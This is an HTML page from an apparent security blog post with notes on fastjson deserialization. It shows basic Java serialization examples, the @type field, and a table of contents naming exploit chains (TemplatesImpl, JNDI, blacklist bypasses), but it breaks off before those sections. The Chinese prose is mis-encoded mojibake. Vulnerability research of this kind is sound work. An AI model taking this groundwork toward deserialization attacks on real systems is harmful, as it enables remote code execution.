<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>ã€notesã€‘æµ…è°ˆfastjsonååºåˆ—åŒ–æ¼æ´ | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
  <meta name="keywords" content>
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 å‰è¨€æœ€è¿‘åˆç¢°ä¸Šäº†fastjsonçš„é¢˜ç›®ï¼Œæƒ³ç€æ˜¯æ—¶å€™åˆ†æä¸€æ³¢è¿™ä¸ªæ¼æ´äº†ï¼Œè·Ÿä¸Šå¸ˆå‚…ä»¬çš„è„šæ­¥ã€‚">
<meta name="keywords" content="vul">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€notesã€‘æµ…è°ˆfastjsonååºåˆ—åŒ–æ¼æ´">
<meta property="og:url" content="http://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="0x00 å‰è¨€æœ€è¿‘åˆç¢°ä¸Šäº†fastjsonçš„é¢˜ç›®ï¼Œæƒ³ç€æ˜¯æ—¶å€™åˆ†æä¸€æ³¢è¿™ä¸ªæ¼æ´äº†ï¼Œè·Ÿä¸Šå¸ˆå‚…ä»¬çš„è„šæ­¥ã€‚">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png">
<meta property="og:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png">
<meta property="og:updated_time" content="2020-11-18T14:33:06.736Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ã€notesã€‘æµ…è°ˆfastjsonååºåˆ—åŒ–æ¼æ´">
<meta name="twitter:description" content="0x00 å‰è¨€æœ€è¿‘åˆç¢°ä¸Šäº†fastjsonçš„é¢˜ç›®ï¼Œæƒ³ç€æ˜¯æ—¶å€™åˆ†æä¸€æ³¢è¿™ä¸ªæ¼æ´äº†ï¼Œè·Ÿä¸Šå¸ˆå‚…ä»¬çš„è„šæ­¥ã€‚">
<meta name="twitter:image" content="http://blog.0kami.cn/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class='wrapper'>
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href='/' >
				0kami's Blog
			</a>
			<div class='menu'>
				<ul class='h-list'>
					
						<li>
							<a class='flat-box nav-home' href='/'>
								Home
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-archives' href='/archives'>
								Archives
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-about' href='/about'>
								About
							</a>
						</li>
					
				</ul>
				<div class='underline'></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search" />
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class='switcher h-list'>
				
					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
				
				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class='nav-sub container container--flex'>
			<a class="logo" class="flat-box" href='javascript:void(0)'>
				Word of Forks
			</a>

			<ul class='switcher h-list'>
				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        <article id="post-java/talk-about-fastjson-deserialization"
  class="post white-box article-type-post"
  itemscope itemprop="blogPost">
	<section class='meta'>
	<h2 class="title">
  	<a href="/2020/04/13/java/talk-about-fastjson-deserialization/">
    	ã€notesã€‘æµ…è°ˆfastjsonååºåˆ—åŒ–æ¼æ´
    </a>
  </h2>
	<time>
	  Apr 13, 2020
	</time>
	
    
    <div class='cats'>
        <a href="/categories/notes/">notes</a>
    </div>

	</section>
	
		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-å‰è¨€"><span class="toc-number">1.</span> <span class="toc-text">0x00 å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-åŸºç¡€çŸ¥è¯†"><span class="toc-number">2.</span> <span class="toc-text">0x01 åŸºç¡€çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-fastjsonçš„åŸºç¡€ä½¿ç”¨"><span class="toc-number">2.1.</span> <span class="toc-text">(1). fastjsonçš„åŸºç¡€ä½¿ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-fastjsonçš„æµç¨‹ç®€ä»‹"><span class="toc-number">2.2.</span> <span class="toc-text">(2).fastjsonçš„æµç¨‹ç®€ä»‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-fastjson-è‡ªåŠ¨è°ƒç”¨getterå’Œsetter"><span class="toc-number">2.3.</span> <span class="toc-text">(3).  fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-parse-å’Œ-parseObjectçš„åŒºåˆ«"><span class="toc-number">2.3.1.</span> <span class="toc-text">1. parse å’Œ parseObjectçš„åŒºåˆ«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘"><span class="toc-number">2.3.2.</span> <span class="toc-text">2. parseè‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„ä¸»è¦é€»è¾‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶"><span class="toc-number">2.3.3.</span> <span class="toc-text">3. çªç ´parseä¸èƒ½è°ƒç”¨æ‰€æœ‰gettersçš„é™åˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ç¬¬ä¸€ç§ï¼šTomcat-BCEL-POCæ€è·¯"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">ç¬¬ä¸€ç§ï¼šTomcat BCEL POCæ€è·¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ç¬¬äºŒç§ï¼š-refç‚¹"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">ç¬¬äºŒç§ï¼š$refç‚¹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-privateå±æ€§"><span class="toc-number">2.4.</span> <span class="toc-text">(4). privateå±æ€§</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-EXPåˆ†æ"><span class="toc-number">3.</span> <span class="toc-text">0x02 EXPåˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-templatesimpl"><span class="toc-number">3.1.</span> <span class="toc-text">(1). templatesimpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-åŸºäºJNDIçš„åˆ©ç”¨"><span class="toc-number">3.2.</span> <span class="toc-text">(2). åŸºäºJNDIçš„åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">3.2.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Tomcat-dbcp-BasicDataSource"><span class="toc-number">3.3.</span> <span class="toc-text">(3). Tomcat dbcp BasicDataSource</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½"><span class="toc-number">4.</span> <span class="toc-text">0x03 Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-fastjson-1-2-25"><span class="toc-number">4.0.1.</span> <span class="toc-text">(1). fastjson == 1.2.25</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-fastjson-1-2-42"><span class="toc-number">4.0.2.</span> <span class="toc-text">(2). fastjson == 1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-fastjson-1-2-43"><span class="toc-number">4.0.3.</span> <span class="toc-text">(3). fastjson == 1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-fastjson-1-2-48"><span class="toc-number">4.0.4.</span> <span class="toc-text">(4). fastjson == 1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ä¿®å¤å‰çš„ç‰ˆæœ¬"><span class="toc-number">4.0.4.1.</span> <span class="toc-text">ä¿®å¤å‰çš„ç‰ˆæœ¬</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ä¿®å¤åçš„ç‰ˆæœ¬"><span class="toc-number">4.0.4.2.</span> <span class="toc-text">ä¿®å¤åçš„ç‰ˆæœ¬</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-åç»­ç‰ˆæœ¬"><span class="toc-number">4.0.5.</span> <span class="toc-text">(5). åç»­ç‰ˆæœ¬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨"><span class="toc-number">4.0.6.</span> <span class="toc-text">(6). åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-æ€»ç»“"><span class="toc-number">5.</span> <span class="toc-text">0x04 æ€»ç»“</span></a></li></ol></section>
	
	<section class="article typo">
  	<div class="article-entry" itemprop="articleBody">
    	<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘åˆç¢°ä¸Šäº†fastjsonçš„é¢˜ç›®ï¼Œæƒ³ç€æ˜¯æ—¶å€™åˆ†æä¸€æ³¢è¿™ä¸ªæ¼æ´äº†ï¼Œè·Ÿä¸Šå¸ˆå‚…ä»¬çš„è„šæ­¥ã€‚</p>
<a id="more"></a>
<h1 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01 åŸºç¡€çŸ¥è¯†"></a>0x01 åŸºç¡€çŸ¥è¯†</h1><hr>
<h2 id="1-fastjsonçš„åŸºç¡€ä½¿ç”¨"><a href="#1-fastjsonçš„åŸºç¡€ä½¿ç”¨" class="headerlink" title="(1). fastjsonçš„åŸºç¡€ä½¿ç”¨"></a>(1). fastjsonçš„åŸºç¡€ä½¿ç”¨</h2><blockquote>
<p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚</p>
</blockquote>
<p>å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢åŒ…æ‹¬äº†3ä¸ªç®€å•çš„å¯¹è±¡Personã€Phoneä»¥åŠNewPhoneï¼Œæˆ‘ä»¬ç”¨fastjsonå°†Personå¯¹è±¡è½¬åŒ–æˆä¸€ä¸ªjsonå­—ç¬¦ä¸²ï¼Œå¹¶è¿˜åŸ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> Phone(<span class="string">"1234567890"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output </span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨fastjsonçš„toJSONStringå¯ä»¥è½»æ˜“åœ°å°†objectè½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ç”¨parseObjectå°†jsonå­—ç¬¦ä¸²è¿˜åŸå‡ºæ¥ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé™åˆ¶å°±æ˜¯</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„å†™æ³•ä¸­ï¼Œç”±äºfastjsonä¸çŸ¥é“éœ€è¦è¿˜åŸçš„Personçš„Phoneæ˜¯æœ¬èº«è¿˜æ˜¯å­ç±»NewPhoneï¼Œé¢å¯¹è¿™ç§å¤šæ€æ–¹å¼ï¼Œfastjsonè¿˜åŸæ˜¯çˆ¶ç±»ï¼Œè€Œä¸æ˜¯å­ç±»NewPhoneã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸¢å¤±äº†Jsonå­—ç¬¦ä¸²ä¸­phoneçš„locationå­—æ®µã€‚è¿™æ˜¾ç„¶æ˜¯ä¸å¯å¿å—çš„ï¼Œæ‰€ä»¥fastjsonç»™æˆ‘ä»¬æä¾›äº†æŒ‡å®šè¿˜åŸç±»çš„å­—æ®µ<code>@type</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"@type":"org.vultest.base.Person","name":"john","phone":&#123;"@type":"org.vultest.base.NewPhone","location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890:China</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡åœ¨toJSONStringçš„æ—¶å€™æŒ‡å®šSerializerFeatureï¼ˆSerializerFeature.WriteClassNameï¼‰ï¼Œä½¿å¾—è½¬åŒ–åçš„jsonå­—ç¬¦ä¸²å¤šäº†<code>@type</code>å­—æ®µã€‚è¿™ä¸ªå­—æ®µæŒ‡ä»£äº†å½“å‰ç±»çš„classï¼Œé¿å…äº†ä¸Šé¢çš„å­ç±»ä¸¢å¤±å­—æ®µçš„é—®é¢˜ã€‚æ¯”å¦‚ä¸Šé¢ç›´æ¥æŒ‡å®šäº†Personå¯¹è±¡çš„phoneå±æ€§çš„ç±»æ˜¯NewPhoneï¼Œè¿˜åŸåæˆåŠŸæ‰“å°å‡ºlocationã€‚</p>
<p>åˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœ<code>@type</code>è¢«æŒ‡å®šä¸ºæŸæ¶æ„çš„ç±»ï¼Œæ˜¯å¦ä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Ÿ</p>
<h2 id="2-fastjsonçš„æµç¨‹ç®€ä»‹"><a href="#2-fastjsonçš„æµç¨‹ç®€ä»‹" class="headerlink" title="(2).fastjsonçš„æµç¨‹ç®€ä»‹"></a>(2).fastjsonçš„æµç¨‹ç®€ä»‹</h2><blockquote>
<p>è¿™é‡Œç›´æ¥å‚è€ƒ<a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
</blockquote>
<p>ç”¨ä¸€ä¸‹å»–å¤§çš„æµç¨‹å›¾</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg" alt="img"></p>
<p>å…·ä½“çš„åˆ†æè¿‡ç¨‹çœ‹ä¸Šé¢çš„é‚£ç¯‡æ–‡ç« å³å¯ï¼Œè¿™é‡Œæä¸€ä¸‹å°†ASMåŠ¨æ€ç”Ÿæˆçš„ä»£ç dumpå‡ºæ¥çš„æ–¹æ³•</p>
<p>åœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼ŒASMåŠ¨æ€ç”Ÿæˆäº†ç›¸åº”çš„bytecodesï¼Œè¿™é‡Œç”¨ideaçš„æ–­ç‚¹æ¥dumpæºç </p>
<p>å…ˆå°†æ–­ç‚¹ä¸‹åœ¨<code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png" alt="image-20200104200324167"></p>
<p>ç”Ÿæˆçš„bytecodesåœ¨codeé‡Œï¼Œç”¨æ‰§è¡Œè¡¨è¾¾å¼çš„åŠŸèƒ½ï¼Œæ‰§è¡Œ<code>(new FileOutputStream(&quot;some.class&quot;)).write(code)</code>å³å¯ç”Ÿæˆ</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png" alt="image-20200104200849550"></p>
<h2 id="3-fastjson-è‡ªåŠ¨è°ƒç”¨getterå’Œsetter"><a href="#3-fastjson-è‡ªåŠ¨è°ƒç”¨getterå’Œsetter" class="headerlink" title="(3).  fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetter"></a>(3).  fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetter</h2><p>ç±»ä¼¼Javaçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨readObjectå‡½æ•°ï¼Œfastjsonè¿˜åŸå¯¹è±¡æ—¶ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨ä»¥ä¸‹å‡ ä¸ªå‡½æ•°ï¼š</p>
<ul>
